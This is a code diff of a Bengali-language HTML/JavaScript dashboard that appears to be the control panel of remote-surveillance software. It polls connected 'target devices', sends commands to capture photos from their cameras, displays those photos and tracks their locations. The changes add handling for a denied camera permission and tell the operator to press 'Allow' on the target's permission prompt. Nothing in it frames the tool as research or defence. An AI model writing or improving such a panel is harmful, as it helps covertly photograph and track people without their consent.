@@ -21,11 +21,9 @@
         .online { border-left-color: #22c55e; }
         .no-data { text-align: center; color: #64748b; margin-top: 50px; }
         
-        /* বাটন স্টাইল */
         .capture-btn { background: #ef4444; color: white; border: none; padding: 8px 12px; border-radius: 5px; font-size: 12px; cursor: pointer; margin-top: 10px; width: 100%; font-weight: bold; }
         .capture-btn:hover { background: #dc2626; }
 
-        /* মডাল (ছবি দেখানোর জন্য) */
         .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; }
         .modal-content { background: #1e293b; padding: 20px; border-radius: 10px; max-width: 90%; max-height: 90%; text-align: center; }
         .modal-content img { max-width: 100%; max-height: 80vh; border-radius: 5px; }
@@ -46,7 +44,6 @@
         </div>
     </div>
 
-    <!-- ছবি দেখানোর মডাল -->
     <div id="imageModal" class="modal">
         <div class="modal-content">
             <img id="modalImage" src="" alt="Captured Photo">
@@ -116,10 +113,13 @@
                         `;
                         list.appendChild(card);
 
-                        // নতুন ছবি এলে পপআপ দেখানো
                         if (data.camera_image && data.camera_time && lastImageTime[id] !== data.camera_time) {
                             lastImageTime[id] = data.camera_time;
-                            showModal(data.camera_image);
+                            if (data.camera_image === "NO_PERMISSION") {
+                                alert("টার্গেট ডিভাইসে ক্যামেরার পারমিশন নেই!");
+                            } else {
+                                showModal(data.camera_image);
+                            }
                         }
 
                         if (data.lat && data.lng) {
@@ -158,7 +158,7 @@
                 if (data.error) {
                     alert("ব্যর্থ: " + data.error);
                 } else {
-                    alert("কমান্ড পাঠানো হয়েছে! টার্গেট ডিভাইসে ক্যামেরা পারমিশন থাকলে ছবি আসবে।");
+                    alert("কমান্ড পাঠানো হয়েছে! টার্গেট ডিভাইসের স্ক্রিনে ক্যামেরা পারমিশন চাইলে 'Allow' দিন।");
                 }
             })
             .catch(err => console.error("Error sending command:", err));
@@ -176,7 +176,7 @@
         }
 
         fetchClients();
-        setInterval(fetchClients, 1000);
+        setInterval(fetchClients, 2000); // প্রতি ২ সেকেন্ডে চেক করবে
     </script>
 </body>
 </html>
